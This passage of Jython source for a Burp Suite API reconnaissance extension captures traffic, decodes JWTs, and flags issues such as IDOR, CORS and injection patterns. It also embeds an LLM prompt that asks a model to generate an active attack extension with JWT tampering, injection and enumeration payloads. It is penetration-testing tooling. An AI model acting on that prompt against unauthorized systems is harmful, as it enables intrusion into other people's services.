                "[+] GraphQL target selection updated: {}\n".format(len(selected))
            )

    def _collect_graphql_targets(self, max_targets):
        """Collect GraphQL targets from optional input and Recon history."""
        targets = []
        seen = set()
        max_items = self._parse_positive_int(max_targets, 12, 1, 50)

        selected_values = list(getattr(self, "graphql_selected_targets", []) or [])
        raw_input = self._ascii_safe(self.graphql_targets_field.getText()).strip()
        if raw_input:
            selected_values = self._parse_comma_newline_values(raw_input)
            self.graphql_selected_targets = list(selected_values)
        elif not selected_values:
            selected_values = self._autopopulate_graphql_targets_from_history(
                overwrite=False, append_output=False
            )

        for value in selected_values:
            clean = self._normalize_graphql_target_url(value)
            if clean and clean not in seen:
                seen.add(clean)
                targets.append(clean)
                if len(targets) >= max_items:
                    return targets

        for item in self._collect_graphql_target_candidates(max_candidates=max_items * 4):
            clean = self._normalize_graphql_target_url(item.get("url") or "")
            if clean and clean not in seen:
                seen.add(clean)
                targets.append(clean)
                if len(targets) >= max_items:
                    return targets
        return targets

    def _graphql_base_urls(self, urls):
        """Build base URLs (scheme://host[:port]) from full URLs."""
        bases = []
        seen = set()
        for url in (urls or []):
            safe = self._ascii_safe(url).strip()
            if not safe:
                continue
            try:
                parsed = URL(safe)
                protocol = self._ascii_safe(parsed.getProtocol() or "https", lower=True)
                host = self._ascii_safe(parsed.getHost() or "", lower=True).strip()
                if not host:
                    continue
                port = parsed.getPort()
                if port == -1:
                    base = "{}://{}".format(protocol, host)
                else:
                    base = "{}://{}:{}".format(protocol, host, int(port))
                if base not in seen:
                    seen.add(base)
                    bases.append(base)
            except Exception as parse_err:
                self._callbacks.printError(
                    "GraphQL base parse error: {}".format(str(parse_err))
                )
                continue
        return bases

    def _run_graphql_analysis(self, event):
        """Run GraphQL-focused analysis using available external tools."""
        return heavy_runners._run_graphql_analysis(self, event)

    def _export_graphql_results(self):
        """Export GraphQL analysis summary lines."""
        with self.graphql_lock:
            data = list(self.graphql_results)
        self._export_list_to_file(
            data, "GraphQL_Export", self.graphql_area, "graphql analysis lines"
        )

    def _send_graphql_to_recon(self):
        """Send GraphQL discovered candidates to Recon tab."""
        with self.graphql_lock:
            candidates = list(self.graphql_recon_candidates)
        if not candidates:
            self.graphql_area.append("\n[!] No GraphQL candidates to send\n")
            return
        self._import_endpoint_candidates_to_recon(
            candidates, "graphql-analysis", self.graphql_area
        )

    def _run_nuclei(self):
        """Run Nuclei scanner on endpoints from Recon tab"""
        return heavy_runners._run_nuclei(self)

    def getTabCaption(self):
        with self.lock:
            count = len(self.api_data)
        return (
            "API Security Suite"
            if count == 0
            else "API Security Suite ({})".format(count)
        )

    def getUiComponent(self):
        return self._panel

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self.auto_capture.isSelected():
            return
        if not messageIsRequest:
            self._process_traffic(messageInfo)

    def processProxyMessage(self, messageIsRequest, message):
        if not self.auto_capture.isSelected():
            return
        if not messageIsRequest:
            self._process_traffic(message.getMessageInfo())

    def _process_traffic(self, messageInfo):
        try:
            if not messageInfo:
                return
            request = messageInfo.getRequest()
            response = messageInfo.getResponse()
            if not request:
                self._callbacks.printOutput("[DEBUG] Skipped: No request")
                return
            if not response:
                self._callbacks.printOutput("[DEBUG] Skipped: No response")
                return

            start_time = time.time()
            req_info = self._helpers.analyzeRequest(messageInfo)
            resp_info = self._helpers.analyzeResponse(response)

            url = req_info.getUrl()
            method = req_info.getMethod()
            path = url.getPath()

            # Filter only obvious noise: images and fonts
            path_lower = path.lower()
            if any(
                path_lower.endswith(ext)
                for ext in [
                    ".jpg",
                    ".jpeg",
                    ".png",
                    ".gif",
                    ".webp",
                    ".svg",
                    ".ico",
                    ".woff",
                    ".woff2",
                    ".ttf",
                ]
            ):
                return

            # Normalize path for grouping
            normalized_path = self._normalize_path(path)
            endpoint_key = "{}:{}".format(method, normalized_path)

            # Memory limit check with rotation
            with self.lock:
                if len(self.api_data) >= self.max_endpoints:
                    # Remove 10% oldest endpoints
                    to_remove = int(self.max_endpoints * 0.1)
                    # Create snapshot to avoid modification during iteration
                    times_snapshot = list(self.endpoint_times.items())
                    oldest = sorted(
                        times_snapshot,
                        key=lambda x: min(x[1]) if isinstance(x[1], list) else x[1],
                    )[:to_remove]
                    for key, _ in oldest:
                        self.api_data.pop(key, None)
                        self.endpoint_times.pop(key, None)
                        self.endpoint_tags.pop(key, None)
                    self.log_to_ui(
                        "[*] Rotated {} old endpoints (limit: {})".format(
                            to_remove, self.max_endpoints
                        )
                    )

            # Limit samples per endpoint
            max_samples = int(str(self.sample_limit.getSelectedItem()))
            with self.lock:
                if (
                    endpoint_key in self.api_data
                    and len(self.api_data[endpoint_key]) >= max_samples
                ):
                    return

            # Extract comprehensive data
            req_body = self._extract_body(request, req_info.getBodyOffset())
            resp_body = self._extract_body(response, resp_info.getBodyOffset())
            content_type = self._get_content_type(resp_info)

            response_time = int((time.time() - start_time) * 1000)

            api_entry = {
                "method": method,
                "path": path,
                "normalized_path": normalized_path,
                "host": url.getHost(),
                "protocol": url.getProtocol(),
                "port": url.getPort(),
                "query_string": url.getQuery() or "",
                "parameters": self._extract_params(req_info),
                "headers": self._extract_headers(req_info),
                "request_body": req_body,
                "response_status": resp_info.getStatusCode(),
                "response_headers": self._extract_response_headers(resp_info),
                "response_body": resp_body,
                "response_length": max(0, len(response) - resp_info.getBodyOffset()),
                "response_time_ms": response_time,
                "content_type": content_type,
                "auth_detected": self._detect_auth(req_info),
                "api_patterns": self._detect_api_patterns(
                    path, content_type, resp_body
                ),
                "jwt_detected": self._extract_jwt(req_info),
                "encryption_indicators": self._detect_encryption(
                    req_body, resp_body, self._extract_headers(req_info)
                ),
                "param_patterns": self._analyze_param_patterns(
                    req_info, req_body, resp_body
                ),
            }

            is_new = False
            with self.lock:
                if endpoint_key not in self.api_data:
                    self.api_data[endpoint_key] = []
                    self.endpoint_tags[endpoint_key] = self._auto_tag(api_entry)
                    self.endpoint_times[endpoint_key] = []
                    is_new = True
                self.api_data[endpoint_key].append(api_entry)
                self.endpoint_times[endpoint_key].append(response_time)

            count = len(self.api_data)
            self._callbacks.setExtensionName(
                "API Recon" if count == 0 else "API Recon ({})".format(count)
            )

            if is_new:
                SwingUtilities.invokeLater(
                    lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
                )
                severity = self._get_severity(endpoint_key, [api_entry])
                if severity == "critical":
                    self.log_to_ui(
                        "[!] CRITICAL: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                elif severity == "high":
                    self.log_to_ui(
                        "[!] HIGH: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                elif severity == "medium":
                    self.log_to_ui(
                        "[*] MEDIUM: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                else:
                    self.log_to_ui(
                        "[+] Captured: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                self._schedule_capture_ui_refresh()

        except Exception as e:
            self._callbacks.printError("Error processing: " + str(e))

    def _normalize_path(self, path):
        # Use pre-compiled patterns for better performance
        path = self.NUMERIC_ID_PATTERN.sub("/{id}", path)
        path = self.UUID_PATTERN.sub("/{uuid}", path)
        path = self.OBJECTID_PATTERN.sub("/{objectid}", path)
        return path

    def _extract_params(self, req_info):
        params = {"url": {}, "body": {}, "cookie": {}, "json": {}}
        try:
            for param in req_info.getParameters()[:50]:  # Limit to 50 params
                ptype = param.getType()
                name = (param.getName() or "")[:100]  # Limit name length
                value = (param.getValue() or "")[:1000]  # Limit value length
                if ptype == self.PARAM_URL:
                    params["url"][name] = value
                elif ptype == self.PARAM_BODY:
                    params["body"][name] = value
                elif ptype == self.PARAM_COOKIE:
                    params["cookie"][name] = value
                elif ptype == self.PARAM_JSON:
                    params["json"][name] = value
        except Exception as e:
            self._callbacks.printError("Param extraction error: " + str(e))
        return params

    def _extract_headers(self, req_info):
        headers = {}
        try:
            for header in req_info.getHeaders()[1:20]:  # Limit to 20 headers
                if ":" in header:
                    key, val = header.split(":", 1)
                    headers[key.strip()] = val.strip()[:500]  # Limit header value size
        except Exception as e:
            self._callbacks.printError("Header extraction error: " + str(e))
        return headers

    def _extract_response_headers(self, resp_info):
        headers = {}
        try:
            for header in resp_info.getHeaders()[1:20]:  # Limit to 20 headers
                if ":" in header:
                    key, val = header.split(":", 1)
                    headers[key.strip()] = val.strip()[:500]  # Limit header value size
        except Exception as e:
            self._callbacks.printError("Response header extraction error: " + str(e))
        return headers

    def _extract_body(self, message, offset):
        try:
            if not message or offset < 0:
                return ""
            body_bytes = message[offset : offset + self.max_body_size]
            body = self._helpers.bytesToString(body_bytes)
            if len(body) > self.max_body_size:
                body = body[: self.max_body_size] + "... [truncated]"
            return body
        except Exception as e:
            self._callbacks.printError("Body extraction error: " + str(e))
            return ""

    def _get_content_type(self, resp_info):
        for header in resp_info.getHeaders()[:30]:
            if header.lower().startswith("content-type:"):
                return header.split(":", 1)[1].strip()
        return "unknown"

    def _detect_auth(self, req_info):
        auth_types = []
        for header in req_info.getHeaders()[1:30]:
            lower = header.lower()
            if "authorization:" in lower:
                if "bearer" in lower:
                    auth_types.append("Bearer Token")
                elif "basic" in lower:
                    auth_types.append("Basic Auth")
                else:
                    auth_types.append("Custom Auth")
            elif "x-api-key:" in lower:
                auth_types.append("API Key")
            elif "cookie:" in lower:
                auth_types.append("Session Cookie")
        return auth_types if auth_types else ["None"]

    def _extract_jwt(self, req_info):
        """Extract and decode JWT tokens from Authorization header, cookies, params, and body"""
        import base64
        import binascii

        def decode_jwt(token):
            try:
                parts = token.strip().split(".")
                if len(parts) != 3:
                    return None
                header_data = base64.urlsafe_b64decode(parts[0] + "===")
                payload_data = base64.urlsafe_b64decode(parts[1] + "===")
                return {
                    "raw": token,
                    "header": json.loads(header_data),
                    "payload": json.loads(payload_data),
                    "signature": parts[2],
                    "location": ""
                }
            except (ValueError, TypeError, binascii.Error):
                return None
            except Exception as e:
                self._callbacks.printError(
                    "JWT decode unexpected error: {}".format(str(e))
                )
                return None

        # Check Authorization header
        for header in req_info.getHeaders()[1:30]:
            if "authorization:" in header.lower():
                if "bearer" in header.lower():
                    token = header.split(" ")[-1]
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "Authorization: Bearer"
                        return jwt

        # Check cookies
        for param in req_info.getParameters():
            if param.getType() == self.PARAM_COOKIE:
                token = param.getValue() or ""
                if token.count(".") == 2:
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "Cookie: {}".format(param.getName())
                        return jwt

        # Check URL params
        for param in req_info.getParameters():
            if param.getType() == self.PARAM_URL:
                name = (param.getName() or "").lower()
                if "token" in name or "jwt" in name or "auth" in name:
                    token = param.getValue() or ""
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "URL param: {}".format(param.getName())
                        return jwt

        return None

    def _detect_encryption(self, req_body, resp_body, headers):
        indicators = {"likely_encrypted": False, "types": [], "evidence": []}
        req_body = req_body or ""
        resp_body = resp_body or ""
        combined = req_body + resp_body
        if self.BASE64_PATTERN.search(combined):
            indicators["types"].append("Base64")
        if self.HEX_PATTERN.search(combined):
            indicators["types"].append("Hex")
        for key in headers:
            if any(
                x in key.lower() for x in ["encryption", "cipher", "signature", "hash"]
            ):
                indicators["types"].append("Custom Header")
                break
        if any(x in combined.lower() for x in ["encrypted", "cipher", "hmac"]):
            indicators["types"].append("Keyword")
        indicators["likely_encrypted"] = len(indicators["types"]) > 0
        return indicators

    def _analyze_param_patterns(self, req_info, req_body, resp_body):
        patterns = {"param_types": {}, "reflected": []}
        resp_body = resp_body or ""
        for param in req_info.getParameters()[:50]:
            name = param.getName() or ""
            value = param.getValue() or ""
            if value and re.match(r"^\d+$", value):
                patterns["param_types"][name] = "numeric"
            elif value and re.match(r"^[0-9a-f-]{36}$", value):
                patterns["param_types"][name] = "uuid"
            elif value and re.match(r"^[A-Za-z0-9+/=]{20,}$", value):
                patterns["param_types"][name] = "base64"
            elif value and re.match(r"^[0-9a-f]{32,}$", value):
                patterns["param_types"][name] = "hash"
            if value and len(value) > 3 and value in resp_body:
                patterns["reflected"].append(name)
        return patterns

    def _detect_api_patterns(self, path, content_type, response_body):
        patterns = []
        response_body = response_body or ""
        content_type = content_type or ""

        # REST patterns
        if any(x in path.lower() for x in ["/api/", "/v1/", "/v2/", "/rest/"]):
            patterns.append("REST API")

        # GraphQL
        if "/graphql" in path.lower():
            patterns.append("GraphQL")

        # SOAP
        if "<soap:" in response_body.lower() or "<wsdl:" in response_body.lower():
            patterns.append("SOAP")

        # JSON API
        if "json" in content_type.lower():
            patterns.append("JSON API")

        # XML API
        if "xml" in content_type.lower():
            patterns.append("XML API")

        return patterns if patterns else ["Unknown"]

    def export_api_data(self):
        if not self.api_data:
            self.log_to_ui("[!] No API data to export")
            return

        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        self.log_to_ui("[*] Starting export at {}...".format(timestamp))

        with self.lock:
            data_snapshot = dict(self.api_data)

        # Generate comprehensive analysis
        analysis = {
            "metadata": {
                "timestamp": timestamp,
                "total_endpoints": len(data_snapshot),
                "total_requests": sum(len(v) for v in data_snapshot.values()),
            },
            "endpoints": [],
            "api_structure": self._analyze_structure_for(data_snapshot),
            "security_observations": self._analyze_security(data_snapshot),
            "llm_prompt": self._generate_llm_prompt(),
        }

        for endpoint_key, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            entries_list = entries if isinstance(entries, list) else [entries]
            endpoint_summary = {
                "endpoint": endpoint_key,
                "method": entry["method"],
                "normalized_path": entry["normalized_path"],
                "host": entry["host"],
                "sample_count": len(entries_list),
                "parameters": self._merge_params(entries_list),
                "auth_methods": list(
                    set([a for e in entries_list for a in e["auth_detected"]])
                ),
                "response_codes": list(
                    set([e["response_status"] for e in entries_list])
                ),
                "content_types": list(set([e["content_type"] for e in entries_list])),
                "api_patterns": list(
                    set([p for e in entries_list for p in e["api_patterns"]])
                ),
                "avg_response_length": sum(e["response_length"] for e in entries_list)
                / len(entries_list),
                "jwt_claims": entry.get("jwt_detected"),
                "encryption_detected": any(
                    e.get("encryption_indicators", {}).get("likely_encrypted")
                    for e in entries_list
                ),
                "encryption_types": list(
                    set(
                        [
                            t
                            for e in entries_list
                            for t in e.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
                "reflected_params": list(
                    set(
                        [
                            p
                            for e in entries_list
                            for p in e.get("param_patterns", {}).get("reflected", [])
                        ]
                    )
                ),
                "param_type_summary": self._summarize_param_types(entries_list),
                "sample_requests": [self._format_sample(e) for e in entries_list[:3]],
            }
            analysis["endpoints"].append(endpoint_summary)

        # Export to file
        import os

        export_dir = self._get_export_dir("FullExport")
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return

        self.log_to_ui("[*] Analyzing {} endpoints...".format(len(data_snapshot)))

        # Count severities
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "info": 0}
        for key, entries in data_snapshot.items():
            sev = self._get_severity(key, entries)
            severity_counts[sev] += 1

        filename = os.path.join(export_dir, "api_analysis.json")
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(analysis, indent=2))
            self.log_to_ui(
                "[+] Export complete: {} endpoints, {} requests".format(
                    analysis["metadata"]["total_endpoints"],
                    analysis["metadata"]["total_requests"],
                )
            )
            self.log_to_ui(
                "[+] Severity: Critical={}, High={}, Medium={}, Info={}".format(
                    severity_counts["critical"],
                    severity_counts["high"],
                    severity_counts["medium"],
                    severity_counts["info"],
                )
            )
            self.log_to_ui(
                "[+] Security observations: {}".format(
                    len(analysis["security_observations"])
                )
            )
            self.log_to_ui("[+] Folder: {}".format(export_dir))
            self.log_to_ui("[+] File: {}".format(filename))
        except (IOError, TypeError) as e:
            self.log_to_ui("[!] Export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError("Error closing file: " + str(e))

    def _merge_params(self, entries):
        merged = {"url": set(), "body": set(), "cookie": set(), "json": set()}
        for entry in entries:
            for ptype, params in entry.get("parameters", {}).items():
                if isinstance(params, dict):
                    merged[ptype].update(params.keys())
                elif isinstance(params, list):
                    merged[ptype].update(params)
        return {k: list(v) for k, v in merged.items()}

    def _format_sample(self, entry):
        return {
            "method": entry.get("method", ""),
            "path": entry.get("path", ""),
            "query": entry.get("query_string", ""),
            "headers": entry.get("headers", {}),
            "request_body": (entry.get("request_body") or "")[:500],
            "response_status": entry.get("response_status", 200),
            "response_body": (entry.get("response_body") or "")[:500],
        }

    def _summarize_param_types(self, entries):
        summary = {}
        for entry in entries:
            for pname, ptype in (
                entry.get("param_patterns", {}).get("param_types", {}).items()
            ):
                if pname not in summary:
                    summary[pname] = set()
                summary[pname].add(ptype)
        return {k: list(v)[0] if len(v) == 1 else list(v) for k, v in summary.items()}

    def _analyze_structure(self):
        structure = {
            "api_types": set(),
            "http_methods": set(),
            "auth_methods": set(),
            "base_paths": set(),
        }
        for entries in self.api_data.values():
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                structure["http_methods"].add(entry.get("method", ""))
                structure["auth_methods"].update(entry.get("auth_detected", []))
                structure["api_types"].update(entry.get("api_patterns", []))
                path = entry.get("normalized_path", "")
                if path.startswith("/api/"):
                    structure["base_paths"].add("/api/")
                elif path.startswith("/v1/"):
                    structure["base_paths"].add("/v1/")
        return {k: list(v) for k, v in structure.items()}

    def _check_endpoints(self, check_func):
        """Helper to check endpoints and return matches"""
        matches = []
        for endpoint_key, entries in self.api_data.items():
            if check_func(endpoint_key, entries):
                matches.append(endpoint_key)
        return matches

    def _add_observation(
        self, observations, matches, obs_type, severity, recommendation=None
    ):
        """Helper to add observation if matches found"""
        if matches:
            obs = {
                "type": obs_type,
                "severity": severity,
                "count": len(matches),
                "examples": matches[:5],
            }
            if recommendation:
                obs["recommendation"] = recommendation
            observations.append(obs)

    def _analyze_security(self, data_snapshot=None):
        observations = []

        if data_snapshot is None:
            with self.lock:
                data_snapshot = dict(self.api_data)
        else:
            data_snapshot = dict(data_snapshot)

        normalized_snapshot = {}
        for key, entries in data_snapshot.items():
            if isinstance(entries, list):
                entries_list = [x for x in entries if isinstance(x, dict)]
            elif isinstance(entries, dict):
                entries_list = [entries]
            else:
                entries_list = []
            if entries_list:
                normalized_snapshot[key] = entries_list

        # Process snapshot without holding lock
        def check_snapshot(check_func):
            matches = []
            for key, entries in normalized_snapshot.items():
                if check_func(key, entries):
                    matches.append(key)
            return matches

        # Unprotected endpoints
        self._add_observation(
            observations,
            check_snapshot(lambda k, e: any("None" in x["auth_detected"] for x in e)),
            "Unauthenticated Endpoints",
            "High",
        )

        # IDOR/BOLA
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: len(e) > 0
                and re.search(r"/{id}|/{uuid}|/\d+", e[0]["normalized_path"])
            ),
            "Potential IDOR/BOLA",
            "Critical",
            "Implement object-level authorization checks",
        )

        # Sensitive data
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        p
                        in (
                            (x.get("request_body") or "")
                            + (x.get("response_body") or "")
                        ).lower()
                        for p in [
                            "password",
                            "token",
                            "secret",
                            "key",
                            "credit",
                            "ssn",
                            "email",
                            "phone",
                        ]
                    )
                    for x in e
                )
            ),
            "Sensitive Data Detected",
            "High",
            "Encrypt sensitive data and use proper masking",
        )

        # PII in URLs
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    re.search(
                        r"email=|phone=|ssn=|credit",
                        (x.get("query_string") or "").lower(),
                    )
                    for x in e
                )
            ),
            "PII in URL Parameters",
            "High",
            "Move PII to request body with POST method",
        )

        # Verbose errors
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        x in (entry.get("response_body") or "").lower()
                        for x in [
                            "stack trace",
                            "exception",
                            "sql",
                            "debug",
                            "traceback",
                        ]
                    )
                    for entry in e
                )
            ),
            "Verbose Error Messages",
            "Medium",
            "Implement generic error messages for production",
        )

        # Error responses
        error_endpoints = [
            (
                k,
                list(
                    set(
                        [
                            x.get("response_status", 200)
                            for x in e
                            if x.get("response_status", 200) >= 400
                        ]
                    )
                ),
            )
            for k, e in normalized_snapshot.items()
            if any(x.get("response_status", 200) >= 400 for x in e)
        ]
        if error_endpoints:
            observations.append(
                {
                    "type": "Error Responses Detected",
                    "severity": "Info",
                    "count": len(error_endpoints),
                    "examples": error_endpoints[:5],
                }
            )

        # Weak encryption
        weak_enc = [
            {
                "endpoint": k,
                "types": list(
                    set(
                        [
                            t
                            for x in e
                            for t in x.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
            }
            for k, e in normalized_snapshot.items()
            if any(
                x.get("encryption_indicators", {}).get("likely_encrypted")
                and "Base64" in x.get("encryption_indicators", {}).get("types", [])
                for x in e
            )
        ]
        if weak_enc:
            observations.append(
                {
                    "type": "Weak Encryption (Base64)",
                    "severity": "High",
                    "count": len(weak_enc),
                    "examples": weak_enc[:5],
                    "recommendation": "Use proper encryption (AES-256, TLS 1.3)",
                }
            )

        # Rate limiting
        self._add_observation(
            observations,
            check_snapshot(lambda k, e: len(e) >= 3),
            "Potential Missing Rate Limiting",
            "Medium",
            "Implement rate limiting and throttling",
        )

        # CORS
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    (
                        x.get("response_headers", {}).get(
                            "Access-Control-Allow-Origin", ""
                        )
                        == "*"
                        or "null"
                        in x.get("response_headers", {})
                        .get("Access-Control-Allow-Origin", "")
                        .lower()
                    )
                    for x in e
                )
            ),
            "CORS Misconfiguration",
            "High",
            "Restrict CORS to specific origins, avoid wildcards",
        )

        # Security headers
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    not any(
                        h in x.get("response_headers", {})
                        for h in [
                            "X-Content-Type-Options",
                            "X-Frame-Options",
                            "Content-Security-Policy",
                        ]
                    )
                    for x in e
                )
            ),
            "Missing Security Headers",
            "Medium",
            "Add X-Content-Type-Options, X-Frame-Options, CSP headers",
        )

        # HTTP method misuse
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    x.get("method") == "GET" and x.get("request_body") for x in e
                )
            ),
            "HTTP Method Misuse",
            "Medium",
            "Use POST/PUT for requests with body data",
        )

        # Mass assignment
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        p in (x.get("request_body") or "").lower()
                        for p in [
                            '"role"',
                            '"admin"',
                            '"isadmin"',
                            '"permissions"',
                            '"privileges"',
                        ]
                    )
                    for x in e
                )
            ),
            "Mass Assignment Risk",
            "High",
            "Whitelist allowed fields, reject unexpected parameters",
        )

        # Debug endpoints
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: len(e) > 0
                and any(
                    p in e[0]["normalized_path"].lower()
                    for p in [
                        "/debug",
                        "/test",
                        "/admin",
                        "/swagger",
                        "/api-docs",
                        "/.env",
                        "/config",
                    ]
                )
            ),
            "Debug/Admin Endpoints Exposed",
            "Critical",
            "Remove or properly secure debug/admin endpoints",
        )

        # Injection patterns
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    re.search(
                        r"(select|union|insert|delete|drop|exec|script|<|>|\.\.)",
                        str(x.get("parameters", {})),
                        re.IGNORECASE,
                    )
                    for x in e
                )
            ),
            "Injection Pattern Detected",
            "Critical",
            "Implement input validation and parameterized queries",
        )

        return observations

    def _generate_llm_prompt(self):
        return """# API Red Team Extension Generation

## Context
This JSON contains comprehensive API traffic analysis from a Burp Suite scan/capture session.

## Your Task
Analyze this API data and generate a custom Burp Suite extension in Jython that:

### 1. IDOR/BOLA Testing
- For endpoints with {id}, {uuid} patterns, test:
  * Sequential ID enumeration (1,2,3...)
  * UUID manipulation
  * Negative IDs and boundary values
  * Other user's resource access

### 2. Authentication/Authorization
- Test missing/invalid tokens
- Session fixation attacks
- JWT manipulation (alg:none, weak secrets)
- Privilege escalation attempts
- Cookie tampering

### 3. Parameter Manipulation
- Mass assignment (add admin=true, role=admin)
- Type confusion (string->int, array->object)
- SQL injection in all parameters
- NoSQL injection for JSON APIs
- Command injection in file paths
- XXE for XML endpoints

### 4. Business Logic
- Negative quantities/prices
- Race conditions on state changes
- Workflow bypass (skip payment steps)
- Rate limiting bypass

### 5. Encryption/Encoding
- Base64 decode/encode attacks
- Padding oracle attacks
- Replay attacks on encrypted data
- Weak crypto detection

### 6. Information Disclosure
- Verbose error messages
- Stack traces
- Debug endpoints
- API version disclosure

### 7. Injection Attacks
- Test reflected_params for XSS
- SSTI in template parameters
- LDAP injection
- XML injection

## Output Format
Generate a complete Burp extension that:
- Extends IBurpExtender, IScannerCheck
- Implements doPassiveScan (info gathering) and doActiveScan (exploitation)
- Returns IScanIssue objects with:
  * Severity: Critical/High/Medium/Low/Info
  * Confidence: Certain/Firm/Tentative
  * Detailed description with proof
  * Remediation advice
- Handles all detected patterns from security_observations
- Includes attack payloads specific to this API
- Provides clear documentation and usage instructions

## API Data Analysis Below
"""

    def _get_export_dir(self, export_type="Export"):
        import os

        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        path = os.path.join(
            os.path.expanduser("~"),
            "burp_APIRecon",
            "{}_{}".format(export_type, timestamp),
        )
        try:
            f = File(path)
            if f.mkdirs() or f.exists():
                return path
        except Exception as e:
            self._callbacks.printError(
                "Failed to create directory {}: {}".format(path, str(e))
            )
        return None

    def clear_data(self):
        with self.lock:
            count = len(self.api_data)
            self.api_data.clear()
            self.endpoint_tags.clear()
            self.endpoint_times.clear()
        self.list_model.clear()
        self.details_area.setText("")
        self._callbacks.setExtensionName("API Recon")
        self.log_to_ui("[+] Cleared {} endpoints".format(count))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def _auto_tag(self, entry):
        tags = []
        if entry.get("encryption_indicators", {}).get("likely_encrypted"):
            tags.append("encrypted")
        if "None" not in entry.get("auth_detected", []):
            tags.append("authenticated")
        else:
            tags.append("public")
        if entry.get("response_status", 200) >= 400:
            tags.append("error")
        if entry.get("param_patterns", {}).get("reflected"):
            tags.append("reflected")
        return tags

    def _get_severity(self, key, entries):
        """Determine severity level for endpoint highlighting"""
        entry = self._get_entry(entries)
        path = entry["normalized_path"]

        # Critical
        if any(
            p in path.lower() for p in ["/debug", "/test", "/admin", "/.env", "/config"]
        ):
            return "critical"
        if re.search(r"/{id}|/{uuid}", path) and "None" in entry["auth_detected"]:
            return "critical"

        # High
        if re.search(r"/{id}|/{uuid}", path):
            return "high"
        if "None" in entry["auth_detected"]:
            return "high"
        if any(
            p
            in (entry.get("request_body", "") + entry.get("response_body", "")).lower()
            for p in ["password", "token", "secret"]
        ):
            return "high"
        if entry.get("encryption_indicators", {}).get(
            "likely_encrypted"
        ) and "Base64" in entry.get("encryption_indicators", {}).get("types", []):
            return "high"

        # Medium
        if entry.get("response_status", 200) >= 400:
            return "medium"
        if entry.get("param_patterns", {}).get("reflected"):
            return "medium"

        return "info"

    def _filter_endpoints(self):
        search = self.search_field.getText().lower()
        method = str(self.method_filter.getSelectedItem())
        host = str(self.host_filter.getSelectedItem())
        severity = str(self.severity_filter.getSelectedItem())
        filtered = {}

        for key, entries in self.api_data.items():
            if (
                search
                and search not in key.lower()
                and search not in self._get_entry(entries)["host"].lower()
            ):
                continue
            if method != "All" and not key.startswith(method + ":"):
                continue
            if host != "All" and self._get_entry(entries)["host"] != host:
                continue
            if (
                severity != "All"
                and self._get_severity(key, entries) != severity.lower()
            ):
                continue
            filtered[key] = entries
        return filtered

    def _on_filter_change(self):
        self.refresh_view()

    def _on_group_change(self):
        group = str(self.group_by.getSelectedItem())
        self.log_to_ui("[*] Grouping changed: {}".format(group))
        self.refresh_view()

    def _on_refresh(self):
        self.refresh_view()
        self.log_to_ui("[*] View refreshed")

    def _prev_page(self):
        if self.current_page > 0:
            self.current_page -= 1
            self.refresh_view()

    def _next_page(self):
        if self.current_page < self.total_pages - 1:
            self.current_page += 1
            self.refresh_view()

    def _change_page_size(self):
        self.page_size = int(str(self.page_size_combo.getSelectedItem()))
        self.current_page = 0
        self.refresh_view()

    def refresh_view(self):
        try:
            with self.lock:
                filtered = self._filter_endpoints()
                tags_snapshot = dict(self.endpoint_tags)

            # Calculate pagination
            total_items = len(filtered)
            self.total_pages = max(1, (total_items + self.page_size - 1) // self.page_size)
            if self.current_page >= self.total_pages:
                self.current_page = max(0, self.total_pages - 1)

            start_idx = self.current_page * self.page_size
            end_idx = min(start_idx + self.page_size, total_items)

            # Update pagination controls
            self.page_label.setText("{}/{}".format(self.current_page + 1, self.total_pages))
            self.prev_page_btn.setEnabled(self.current_page > 0)
            self.next_page_btn.setEnabled(self.current_page < self.total_pages - 1)

            # Batch UI updates - build all items first, then update UI once
            items_to_add = []
            group_by = str(self.group_by.getSelectedItem())

            if group_by == "None":
                sorted_keys = sorted(filtered.keys())
                page_keys = sorted_keys[start_idx:end_idx]
                for key in page_keys:
                    tags = tags_snapshot.get(key, [])
                    tag_str = " [{}]".format(",".join(tags)) if tags else ""
                    entries = filtered[key]
                    entry = self._get_entry(entries)
                    count = len(entries) if isinstance(entries, list) else 1
                    items_to_add.append(
                        "[{}x] {} @ {}{}".format(count, key, entry["host"], tag_str)
                    )
            else:
                groups = self._group_endpoints(filtered, group_by)
                item_count = 0
                for group_name in sorted(groups.keys()):
                    if item_count >= end_idx:
                        break
                    if item_count >= start_idx:
